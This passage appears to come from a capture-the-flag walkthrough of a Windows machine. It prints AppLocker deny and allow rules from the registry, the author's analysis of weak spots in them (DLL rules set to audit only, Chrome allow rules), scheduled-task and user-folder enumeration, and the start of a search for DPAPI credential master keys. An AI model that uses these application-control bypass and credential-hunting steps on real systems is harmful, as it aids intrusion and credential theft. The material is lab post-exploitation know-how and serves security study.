HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\14566f23-dced-4974-85ff-03c422112ccb
    Value    REG_SZ    <FilePathRule Id="14566f23-dced-4974-85ff-03c422112ccb" Name="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\18191057-0a59-4a40-a607-d58cc677257b
    Value    REG_SZ    <FilePathRule Id="18191057-0a59-4a40-a607-d58cc677257b" Name="%WINDIR%\Registration\CRMLog:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Registration\CRMLog:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\1ae08f7f-727a-46f9-8f1e-1bfff75fcebd
    Value    REG_SZ    <FilePathRule Id="1ae08f7f-727a-46f9-8f1e-1bfff75fcebd" Name="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\1b7af4a7-e13a-4f98-a982-5fed08155905
    Value    REG_SZ    <FilePathRule Id="1b7af4a7-e13a-4f98-a982-5fed08155905" Name="%SYSTEM32%\winevt\Logs:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\winevt\Logs:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\1cd17645-4d88-41bb-b371-f9c5da231a95
    Value    REG_SZ    <FilePathRule Id="1cd17645-4d88-41bb-b371-f9c5da231a95" Name="%WINDIR%\Temp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Temp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\23146e66-90d7-41e8-bf64-bb9a7ffeba11
    Value    REG_SZ    <FilePathRule Id="23146e66-90d7-41e8-bf64-bb9a7ffeba11" Name="SCCM - %WINDIR%\ccm\inventory\noidmifs\*" Description="SCCM specific" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\inventory\noidmifs\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\32181f38-aed2-462d-8777-ffff4186645e
    Value    REG_SZ    <FilePathRule Id="32181f38-aed2-462d-8777-ffff4186645e" Name="Block CL_Invocation.ps1 (script)" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\34167e2a-5ec3-4aa5-bf66-194e00263c03
    Value    REG_SZ    <FilePathRule Id="34167e2a-5ec3-4aa5-bf66-194e00263c03" Name="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Microsoft\Crypto\RSA\MachineKeys\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\34cc9ec3-a9b5-4c12-bca0-47960b22a0b9
    Value    REG_SZ    <FilePathRule Id="34cc9ec3-a9b5-4c12-bca0-47960b22a0b9" Name="%WINDIR%\Tasks:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tasks:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\379feb23-401e-435c-ae19-b5989a20c5b1
    Value    REG_SZ    <FilePathRule Id="379feb23-401e-435c-ae19-b5989a20c5b1" Name="%SYSTEM32%\Spool\PRINTERS.\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\PRINTERS.\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\389d6553-5030-47e5-99f0-67a58168b6eb
    Value    REG_SZ    <FilePathRule Id="389d6553-5030-47e5-99f0-67a58168b6eb" Name="%WINDIR%\tracing:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\tracing:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\3a4670d0-6466-4a27-8533-3916ce0538d8
    Value    REG_SZ    <FilePathRule Id="3a4670d0-6466-4a27-8533-3916ce0538d8" Name="%WINDIR%\Temp:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Temp:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\3e1482c3-79af-4e83-b610-721dc48c60e8
    Value    REG_SZ    <FilePathRule Id="3e1482c3-79af-4e83-b610-721dc48c60e8" Name="Users-writable Path: %WINDIR%\SysWOW64\FxsTmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\SysWOW64\FxsTmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\3f077ed4-8287-44bc-a103-507e75014eb6
    Value    REG_SZ    <FilePathRule Id="3f077ed4-8287-44bc-a103-507e75014eb6" Name="Users-writable Path: %WINDIR%\Registration\CRMLog\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Registration\CRMLog\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\449ac295-e4f5-4d18-8857-56e2139f5e6c
    Value    REG_SZ    <FilePathRule Id="449ac295-e4f5-4d18-8857-56e2139f5e6c" Name="Users-writable Path: %SYSTEM32%\com\dmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\com\dmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\466e3e5c-6658-4d4c-8c30-b3b3a6123f73
    Value    REG_SZ    <FilePathRule Id="466e3e5c-6658-4d4c-8c30-b3b3a6123f73" Name="%SYSTEM32%\spool\drivers\color:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\drivers\color:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\4a11d042-15e4-4ac2-8357-46fbaa0f2d29
    Value    REG_SZ    <FilePathRule Id="4a11d042-15e4-4ac2-8357-46fbaa0f2d29" Name="Users-writable Path: %WINDIR%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcon\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ServiceProfiles\LocalService\AppData\Local\Microsoft\Dlna\DeviceIcon\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\4c9a142a-b2d6-48e1-baa3-1d3dea839cf0
    Value    REG_SZ    <FilePathRule Id="4c9a142a-b2d6-48e1-baa3-1d3dea839cf0" Name="Users-writable Path: %SYSTEM32%\Drivers\DriverData\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Drivers\DriverData\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\4cb8c344-071b-4b4f-85c4-21d67ddc064c
    Value    REG_SZ    <FilePathRule Id="4cb8c344-071b-4b4f-85c4-21d67ddc064c" Name="Users-writable Path: %WINDIR%\SysWOW64\com\dmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\SysWOW64\com\dmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\58f2f080-3acf-47a9-a711-5b5a57b04aa6
    Value    REG_SZ    <FilePathRule Id="58f2f080-3acf-47a9-a711-5b5a57b04aa6" Name="%SYSTEM32%\winevt\Logs\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\winevt\Logs\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\69deed0e-e202-41a1-bb19-4cd2b7c27ee3
    Value    REG_SZ    <FilePathRule Id="69deed0e-e202-41a1-bb19-4cd2b7c27ee3" Name="%WINDIR%\debug\WIA\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\debug\WIA\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\6ce0a2ad-b4b9-431b-b275-096b5568adb2
    Value    REG_SZ    <FilePathRule Id="6ce0a2ad-b4b9-431b-b275-096b5568adb2" Name="%SYSTEM32%\Spool\SERVERS:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\SERVERS:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\72a7b2cf-296d-43fc-a98d-2977a2eb8ae1
    Value    REG_SZ    <FilePathRule Id="72a7b2cf-296d-43fc-a98d-2977a2eb8ae1" Name="Users-writable Path: %WINDIR%\servicing\Sessions\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\servicing\Sessions\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\757e576f-312d-459d-8674-ef72e98f7d18
    Value    REG_SZ    <FilePathRule Id="757e576f-312d-459d-8674-ef72e98f7d18" Name="%SYSTEM32%\Com\dmp:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Com\dmp:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\7d0a1710-e73a-47c2-a2d5-f0a261cab55e
    Value    REG_SZ    <FilePathRule Id="7d0a1710-e73a-47c2-a2d5-f0a261cab55e" Name="%SYSTEM32%\spool\drivers\color\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\drivers\color\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\7f91b30d-9f77-4bb0-8d98-ec78a6fc5d64
    Value    REG_SZ    <FilePathRule Id="7f91b30d-9f77-4bb0-8d98-ec78a6fc5d64" Name="%WINDIR%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\8078a018-8789-432d-801b-189475e637c8
    Value    REG_SZ    <FilePathRule Id="8078a018-8789-432d-801b-189475e637c8" Name="%WINDIR%\Registration\CRMLog\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Registration\CRMLog\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\9428c672-5fc3-47f4-808a-a0011f36dd2c
    Value    REG_SZ    <FilePathRule Id="9428c672-5fc3-47f4-808a-a0011f36dd2c" Name="(Default Rule) All scripts located in the Windows folder" Description="Allows members of the Everyone group to run scripts that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\9b2f91e3-a07a-4d3e-9a98-844c4a288bda
    Value    REG_SZ    <FilePathRule Id="9b2f91e3-a07a-4d3e-9a98-844c4a288bda" Name="%SYSTEM32%\Spool\SERVERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\SERVERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\a23da731-7f88-4088-aff7-1628f6d750d3
    Value    REG_SZ    <FilePathRule Id="a23da731-7f88-4088-aff7-1628f6d750d3" Name="Users-writable Path: %WINDIR%\servicing\Packages\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\servicing\Packages\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\a7643ac1-a475-4e09-9cf0-49a41d89c475
    Value    REG_SZ    <FilePathRule Id="a7643ac1-a475-4e09-9cf0-49a41d89c475" Name="SCCM - %WINDIR%\ccm\logs\*" Description="SCCM specific" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\logs\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\a7985ddf-19b6-41ab-a299-f3dd49e72af3
    Value    REG_SZ    <FilePathRule Id="a7985ddf-19b6-41ab-a299-f3dd49e72af3" Name="%SYSTEM32%\Printing_Admin_Scripts\en-US\pubprn.vbs" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Printing_Admin_Scripts\en-US\pubprn.vbs"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\a9acff43-06fa-445f-8c6c-56c64af8caed
    Value    REG_SZ    <FilePathRule Id="a9acff43-06fa-445f-8c6c-56c64af8caed" Name="Users-writable Path: %WINDIR%\Logs\OpsMgrTrace\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Logs\OpsMgrTrace"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\aa915c9e-e101-45b5-a969-b390e2e14c71
    Value    REG_SZ    <FilePathRule Id="aa915c9e-e101-45b5-a969-b390e2e14c71" Name="%SYSTEM32%\FxsTmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\FxsTmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\abe669b9-44af-4673-a612-c4bad91b5c43
    Value    REG_SZ    <FilePathRule Id="abe669b9-44af-4673-a612-c4bad91b5c43" Name="%WINDIR%\debug\WIA:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\debug\WIA:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\adc08305-c6fe-44f3-8bee-242ef878a0f3
    Value    REG_SZ    <FilePathRule Id="adc08305-c6fe-44f3-8bee-242ef878a0f3" Name="Users-writable Path: %SYSTEM32%\Tasks_Migrated\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks_Migrated\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\b1aadf0e-1eaf-461c-98fc-5c154b0a6abe
    Value    REG_SZ    <FilePathRule Id="b1aadf0e-1eaf-461c-98fc-5c154b0a6abe" Name="Users-writable Path: %WINDIR%\SysWOW64\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\SysWOW64\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\b627c2fb-0e6a-479c-8603-7d173d498935
    Value    REG_SZ    <FilePathRule Id="b627c2fb-0e6a-479c-8603-7d173d498935" Name="%SYSTEM32%\Com\dmp\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Com\dmp\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\bc9c6d1b-918b-4b55-8fde-54987607877b
    Value    REG_SZ    <FilePathRule Id="bc9c6d1b-918b-4b55-8fde-54987607877b" Name="%SYSTEM32%\Tasks:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\c40ec82c-f57e-42bf-9c65-ec26b11e856b
    Value    REG_SZ    <FilePathRule Id="c40ec82c-f57e-42bf-9c65-ec26b11e856b" Name="%WINDIR%\tracing\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\tracing\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\c4cb943d-396a-43b3-a124-354bb33b9ae1
    Value    REG_SZ    <FilePathRule Id="c4cb943d-396a-43b3-a124-354bb33b9ae1" Name="Users-writable Path: %WINDIR%\Tracing\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tracing\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\cc087233-35f7-480b-a8ee-3173846e385c
    Value    REG_SZ    <FilePathRule Id="cc087233-35f7-480b-a8ee-3173846e385c" Name="Users-writable Path: %SYSTEM32%\spool\PRINTERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\PRINTERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\d3f0b8b9-424c-48cc-9b4f-82c191765c7f
    Value    REG_SZ    <FilePathRule Id="d3f0b8b9-424c-48cc-9b4f-82c191765c7f" Name="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\dde614f4-ed3b-4e62-a44a-00b88330b8e1
    Value    REG_SZ    <FilePathRule Id="dde614f4-ed3b-4e62-a44a-00b88330b8e1" Name="Users-writable Path: %WINDIR%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\e0881b63-2a2f-4eae-9b49-3583997d2c6e
    Value    REG_SZ    <FilePathRule Id="e0881b63-2a2f-4eae-9b49-3583997d2c6e" Name="%SYSTEM32%\Spool\PRINTERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Spool\PRINTERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\e24a360b-f3f4-4102-b32c-9079ba1a349b
    Value    REG_SZ    <FilePathRule Id="e24a360b-f3f4-4102-b32c-9079ba1a349b" Name="SCCM - %WINDIR%\ccm\inventory\noidmifs:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\inventory\noidmifs:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\e39761cb-8314-445b-8f96-9d7bef56e4ad
    Value    REG_SZ    <FilePathRule Id="e39761cb-8314-445b-8f96-9d7bef56e4ad" Name="%SYSTEM32%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\e5993db5-8f6d-4a65-9471-71f64bd0b43e
    Value    REG_SZ    <FilePathRule Id="e5993db5-8f6d-4a65-9471-71f64bd0b43e" Name="%SYSTEM32%\FxsTmp:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\FxsTmp:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\eb4ee599-a800-4ed6-bf40-3348c93e3d00
    Value    REG_SZ    <FilePathRule Id="eb4ee599-a800-4ed6-bf40-3348c93e3d00" Name="Users-writable Path: %SYSTEM32%\spool\drivers\color\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\drivers\color\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\ec67734d-d08a-41df-8ee7-ee7c4087d647
    Value    REG_SZ    <FilePathRule Id="ec67734d-d08a-41df-8ee7-ee7c4087d647" Name="%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\ed97d0cb-15ff-430f-b82c-8d7832957725
    Value    REG_SZ    <FilePathRule Id="ed97d0cb-15ff-430f-b82c-8d7832957725" Name="(Default Rule) All scripts" Description="Allows members of the local Administrators group to run all scripts." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\f0a26bb5-d83b-4c0e-b7eb-f6abfb0f0857
    Value    REG_SZ    <FilePathRule Id="f0a26bb5-d83b-4c0e-b7eb-f6abfb0f0857" Name="Users-writable Path: %SYSTEM32%\spool\SERVERS\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\spool\SERVERS\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\f73c7fe4-bc06-40f6-b757-7920828b503f
    Value    REG_SZ    <FilePathRule Id="f73c7fe4-bc06-40f6-b757-7920828b503f" Name="SCCM - %WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput\*" Description="SCCM specific" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\systemtemp\appvtempdata\appvcommandoutput\*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\f8d0db65-d8c3-473f-bb3c-82056d4f7dce
    Value    REG_SZ    <FilePathRule Id="f8d0db65-d8c3-473f-bb3c-82056d4f7dce" Name="SCCM - %WINDIR%\ccm\logs:*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%WINDIR%\ccm\logs:*"/></Conditions></FilePathRule>

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Script\fd8b0540-4be8-40e0-b5f1-aaf2a60a68b1
    Value    REG_SZ    <FilePathRule Id="fd8b0540-4be8-40e0-b5f1-aaf2a60a68b1" Name="Users-writable Path: %SYSTEM32%\Tasks\*" Description="" UserOrGroupSid="S-1-1-0" Action="Deny"><Conditions><FilePathCondition Path="%SYSTEM32%\Tasks\*"/></Conditions></FilePathRule>
```

There’s a lot here. The highlights are:

-   `powershell.exe` is blocked only for user `S-1-5-21-1842486011-416502281-2506894253-1000`, which `whoami /user` shows is web.
-   `SrpV2\Dll` has `EnforcementMode = 0x0`, which is audit only, so any DLL can load. That’s why I was able to load a DLL with SQLite.
-   At the top level, `.exe` files can be run from `%WINDIR%\*` and `%ProgramFiles%\*` for everyone, and Admins in any directory. But then there’s a long carve-out of every default user-writable directory inside those directories (like `\Temp`, `\Tasks`, `\tracing`, `\Registration\CRMLog`, `\spool\drivers\color`, etc).
-   Two binaries, `chromedriver.exe` and `chrome.exe`, have Allow rules by file hash with the name saying that they are there to support “seleniumSimulator(Task schudler)”.

If `chromedriver.exe` or `chrome.exe` were run by an admin or even just another user, I could look at a DLL hijack, but it’s run as web:

```
C:\Users\web\Desktop>schtasks /query /tn "seleniumSimulator" /fo LIST /v

Folder: \
HostName:                             ELOQUIA
TaskName:                             \seleniumSimulator
Next Run Time:                        N/A
Status:                               Disabled
Logon Mode:                           Interactive/Background
Last Run Time:                        10/13/2026 4:53:15 AM
Last Result:                          2
Author:                               ELOQUIA\Administrator
Task To Run:                          "C:\Program Files\Python311\python.exe" "C:\Program Files\Automation Scripts\seleniumSimulator.py"
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Disabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode
Run As User:                          web
Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: Disabled
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
```

#### Users

```
C:\Users\web>tree . /f
tree . /f
Folder PATH listing
Volume serial number is 22C6-32BB
C:\USERS\WEB
.cache
   selenium
          se-metadata.json

       chrome
          win64
              123.0.6312.122
                    123.0.6312.122.manifest
                    ABOUT
                    chrome.dll
                    chrome.exe
...[snip]...

                 locales
                        af.pak
...[snip]...

                 MEIPreload
                         manifest.json
                         preloaded_data.pb

              142.0.7444.175
                     142.0.7444.175.manifest
                     ABOUT
                     chrome.dll
                     chrome.exe
...[snip]...

                  hyphen-data
                         hyph-af.hyb
...[snip]...
                         manifest.json

                  IwaKeyDistribution
                         iwa-key-distribution.pb
                         manifest.json

                  locales
                         af.pak
...[snip]...
                         zh-TW_NEUTER.pak

                  MEIPreload
                         manifest.json
                         preloaded_data.pb

                  PrivacySandboxAttestationsPreloaded
                         manifest.json
                         privacy-sandbox-attestations.dat

                  resources
                      accessibility
                             reading_mode_gdocs_helper_manifest.json

                          reading_mode_gdocs_helper
                                  content.js
                                  gdocs_script.js

       chromedriver
           win64
               123.0.6312.122
                      chromedriver.exe

               142.0.7444.175
                       chromedriver.exe

.idlerc
       breakpoints.lst
       recent-files.lst

3D Objects
Contacts
Desktop
       user.txt

Documents
Downloads
Favorites
      Bing.url

   Links
Links
       Desktop.lnk
       Downloads.lnk

Music
Pictures
Saved Games
Searches
Videos
```

Other than the Chrome install and `user.txt`, the non-hidden directories in web’s home directory are pretty boring.

There are home directories for Administrator and Olivia.KAT in addition to web:

```swift
C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users

04/20/2024  11:50 AM    <DIR>          .
04/20/2024  11:50 AM    <DIR>          ..
11/28/2025  11:21 AM    <DIR>          Administrator
04/20/2024  11:50 AM    <DIR>          Olivia.KAT
04/15/2024  09:26 PM    <DIR>          Public
10/22/2025  01:31 PM    <DIR>          web
               0 File(s)              0 bytes
               6 Dir(s)   5,282,582,528 bytes free
```

web can’t access either of them.

#### DPAPI

I’ll check for saved credentials in DPAPI. There are multiple master keys:

```swift
C:\Users\web\AppData\Roaming\Microsoft\Protect>dir /a
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Roaming\Microsoft\Protect

04/19/2024  05:53 PM    <DIR>          .
04/19/2024  05:53 PM    <DIR>          ..
04/19/2024  05:53 PM                24 CREDHIST
04/19/2024  05:53 PM    <DIR>          S-1-5-21-1842486011-416502281-2506894253-1000
               1 File(s)             24 bytes
               3 Dir(s)   5,282,582,528 bytes free
C:\Users\web\AppData\Roaming\Microsoft\Protect\>dir /a S-1-5-21-1842486011-416502281-2506894253-1000
 Volume in drive C has no label.
 Volume Serial Number is 22C6-32BB

 Directory of C:\Users\web\AppData\Roaming\Microsoft\Protect\S-1-5-21-1842486011-416502281-2506894253-1000

10/11/2026  02:23 PM    <DIR>          .
10/11/2026  02:23 PM    <DIR>          ..
